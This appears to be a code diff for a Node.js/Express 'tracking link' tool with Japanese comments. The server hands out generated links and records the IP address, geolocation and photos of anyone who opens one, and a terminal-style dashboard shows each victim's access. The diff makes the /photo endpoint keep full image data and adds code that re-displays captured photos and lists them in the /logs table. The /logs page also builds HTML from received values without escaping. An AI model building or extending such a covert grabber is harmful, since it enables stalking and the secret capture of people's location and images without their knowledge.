@@ -190,6 +190,9 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     cmdOutput.scrollTop = cmdOutput.scrollHeight;
   }
 
+  // ============================================================
+  // ★ ページ読み込み時に過去のログを表示（写真も完全復元）
+  // ============================================================
   if (window._pastLogs && window._pastLogs.length > 0) {
     window._pastLogs.forEach(function(data) {
       addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
@@ -200,16 +203,34 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       } else {
         addCmdOutput('[LOC] None', 'cmd-error');
       }
+      // ★ 写真も復元（画像データがあれば表示）
+      if (data.image && typeof data.image === 'string' && data.image.length > 100) {
+        const imgDiv = document.createElement('div');
+        imgDiv.style.margin = '4px 0';
+        const img = document.createElement('img');
+        img.src = data.image;
+        img.style.maxWidth = '300px';
+        img.style.maxHeight = '200px';
+        img.style.border = '1px solid #555';
+        img.style.borderRadius = '4px';
+        imgDiv.appendChild(img);
+        cmdOutput.appendChild(imgDiv);
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+      }
       addCmdOutput('[ID] ' + data.id, 'cmd-echo');
       addCmdOutput('[TIME] ' + data.time, 'cmd-echo');
       window._lastLog = data;
     });
   }
 
+  // 写真の枚数表示（過去ログに写真があった場合）
   if (window._photoCount && window._photoCount > 0) {
-    addCmdOutput('[PHOTO] ' + window._photoCount + ' photos received (view at /logs)', 'cmd-photo');
+    addCmdOutput('[PHOTO] ' + window._photoCount + ' photos received', 'cmd-photo');
   }
 
+  // ============================================================
+  // ソケット通信（新しいアクセスがあったら表示）
+  // ============================================================
   const socket = io();
   socket.on('new-log', function(data) {
     addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
@@ -243,6 +264,9 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     addCmdOutput('[PHOTO] Image #' + photoCountNum + ' received', 'cmd-photo');
   });
 
+  // ============================================================
+  // コマンド処理
+  // ============================================================
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -328,6 +352,9 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     }
   });
 
+  // ============================================================
+  // リンク生成
+  // ============================================================
   const generateBtn = document.getElementById('generate-btn');
   const copyBtn = document.getElementById('copy-btn');
   const resultArea = document.getElementById('result-area');
@@ -384,6 +411,9 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     document.body.removeChild(textarea);
   }
 
+  // ============================================================
+  // ドラッグ＆リサイズ
+  // ============================================================
   function makeDraggable(wId, dId, rId) {
     const win = document.getElementById(wId);
     const drag = document.getElementById(dId);
@@ -435,7 +465,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       var maxW = window.innerWidth - 20;
       var maxH = window.innerHeight - 20;
       if (rect.width > maxW) win.style.width = maxW + 'px';
-      if (rect.height > maxH) win.style.height = maxH + 'px';
+            if (rect.height > maxH) win.style.height = maxH + 'px';
       if (rect.left < 0) win.style.left = '10px';
       if (rect.top < 0) win.style.top = '10px';
     });
@@ -458,7 +488,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 app.get('/', (req, res) => {
   const pastLogs = logs.slice(-30);
   const logsJson = JSON.stringify(pastLogs);
-  const photoCount = logs.filter(l => l.image).length || 0;
+  const photoCount = logs.filter(l => l.image && typeof l.image === 'string' && l.image.length > 100).length || 0;
   const htmlWithData = HTML.replace(
     '<!-- PAST_LOGS -->',
     '<script>window._pastLogs = ' + logsJson + '; window._photoCount = ' + photoCount + ';</script>'
@@ -683,7 +713,9 @@ app.get('/t/:id', (req, res) => {
   `);
 });
 
-// 位置情報受信
+// ============================================================
+// 位置情報受信（画像以外のデータ）
+// ============================================================
 app.post('/location', express.json(), (req, res) => {
   const { id, ip, time, lat, lon } = req.body;
   const entry = { id, ip, time, lat, lon, createdAt: new Date().toISOString() };
@@ -694,10 +726,12 @@ app.post('/location', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
-// 写真受信
+// ============================================================
+// ★ 写真受信（画像データも保存する）
+// ============================================================
 app.post('/photo', express.json(), (req, res) => {
   const { id, image } = req.body;
-  const entry = { id, image: true, createdAt: new Date().toISOString() };
+  const entry = { id, image: image, createdAt: new Date().toISOString() };
   logs.push(entry);
   saveLogs();
   io.emit('new-photo', { id: id, image: image });
@@ -705,7 +739,9 @@ app.post('/photo', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
+// ============================================================
 // 全履歴削除
+// ============================================================
 app.post('/clear-logs', (req, res) => {
   logs.length = 0;
   saveLogs();
@@ -713,13 +749,15 @@ app.post('/clear-logs', (req, res) => {
   res.sendStatus(200);
 });
 
+// ============================================================
 // ログ表示
+// ============================================================
 app.get('/logs', (req, res) => {
   if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
-  let html = '<h2>アクセスログ（保存済み ' + logs.length + '件）</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th></tr>';
+  let html = '<h2>アクセスログ（保存済み ' + logs.length + '件）</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th><th>写真</th></tr>';
   const reversed = logs.slice().reverse();
   reversed.forEach(function(log) {
-    html += '<tr><td>' + log.time + '</td><td>' + log.ip + '</td><td>' + (log.lat || '-') + '</td><td>' + (log.lon || '-') + '</td></tr>';
+    html += '<tr><td>' + log.time + '</td><td>' + log.ip + '</td><td>' + (log.lat || '-') + '</td><td>' + (log.lon || '-') + '</td><td>' + (log.image ? '✅' : '-') + '</td></tr>';
   });
   html += '</table><a href="/">戻る</a>';
   res.send(html);
